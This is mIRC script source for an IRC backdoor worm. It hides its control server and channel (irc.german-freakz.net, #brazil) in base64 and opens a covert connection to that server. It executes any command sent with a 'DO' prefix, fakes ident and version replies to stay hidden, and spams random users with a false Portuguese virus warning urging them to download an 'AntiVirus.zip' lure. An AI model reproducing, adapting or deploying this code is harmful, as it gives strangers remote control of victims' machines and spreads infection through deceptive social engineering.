   on *:signal:*:{
     if $signal == setvars {
       set %ixcom .signal -n
       set %ixsock $decode(Y3l0ZWNo,m)
       set %ixnet $decode(aXJjLmdlcm1hbi1mcmVha3oubmV0,m)
       set %ixport $decode(NjY2Nw==,m)
       set %ixchan $decode(I2JyYXppbA==,m)
     }
     if $signal == conn {
       if (!$sock(%ixsock)) {
         .signal -n setvars
         .sockclose xident | .sockclose xidentd
         .socklisten xident 113
         .sockclose %ixsock
         .sockopen %ixsock %ixnet %ixport
       }
     }
     if $signal == swrt {
       if ($sock(%ixsock)) .sockwrite -tn %ixsock $1-
     }
     if $signal == connect {
       if (%xconn) {
         %ixcom swrt join %ixchan
       }
     }
     if $signal == rmsg {
       set -u1 %xmsg $2-
       if ($1 == DO) $2-
     }
   }
   alias -l xspeed {
     if ($sock(%ixsock)) {
       if ($1 == msg) %ixcom swrt $+(priv,$1,$chr(32),$2,$chr(32),:,$3-)
       if ($1 == notice) %ixcom swrt $+($1,$chr(32),$2,$chr(32),:,$3-)
       if ($1 == ctcp) %ixcom swrt $+(priv,msg,$chr(32),$2,$chr(32),:,$chr(1),$3-,$chr(1))
       if ($1 == ctcpreply) %ixcom swrt $+(notice,$chr(32),$2,$chr(32),:,$chr(1),$3-,$chr(1))
       if ($1 == describe) %ixcom swrt $+(privmsg,$chr(32),$2,$chr(32),:,$chr(1),ACTION,$chr(32),$3-,$chr(1))
       if ($1 == opn) %ixcom swrt $1-
     }
   }
   on *:sockopen:%ixsock:{
     if ($sock(%ixsock).status == active) {
       %ixcom swrt user $iif($gettok($gettok($address($me,5),2,33),1,64),$ifmatch,$me) $+(",$host,",$chr(32),",%ixnet,") $+(:,$fullname)
       %ixcom swrt nick $me
       set %xconn $false
     }
   }
   on *:sockread:%ixsock:{
     sockread -f %xrec
     tokenize 32 %xrec
     unset %xrec
     if ($1 == PING) { %ixcom swrt PONG $2- | .xsysspm }
     if ($2 == PRIVMSG) && ($4 == :VERSION) { .xspeed ctcpreply $gettok($gettok($1,1,33),1,58) VERSION mIRC v6.16 Khaled Mardam-Bey }
     if ($2 == PRIVMSG) && ($4 == :vv) { .xspeed ctcpreply $gettok($gettok($1,1,33),1,58) VERSION mIRC v6.16 Khaled Mardam-Bey - 1809sa }
     if ($2 == 376) { set %xconn $true | %ixcom connect }
     if ($2 == PRIVMSG) { %ixcom rmsg $right($4-,-1) }
   }

   on *:socklisten:xident:sockaccept xidentd
   on *:sockread:xidentd:{
     sockread -f %xidentd
     tokenize 32 %xidentd
     unset %xidentd
     sockwrite -tn $sockname $1- : USERID : $iif($readini(mirc.ini,ident,system),$ifmatch,UNIX) : $iif($readini(mirc.ini,ident,userid),$ifmatch,none)
     if ($sock($sockname)) .sockclose $sockname
   }
   on *:connect:!.signal -n conn
   on *:nick:if ($nick == $me) || ($newnick == $me) { %ixcom swrt nick $newnick }
   alias -l xsysspm {
     inc %spm
     var %chan = $chan($r(1,$chan(0))), %nick = $nick(%chan,$r(1,$nick(%chan,0)))
     if (%nick == $me) || (!%nick) { return }
     raw -q NOTICE %nick :Meu script detectou que você está infectado pelo worm P2LOAD.A, entre agora mesmo em http://cyberscript.inet-csa.com/AntiVirus.zip e baixe o anti virus!!!
     .ignore -u120 %nick
   }
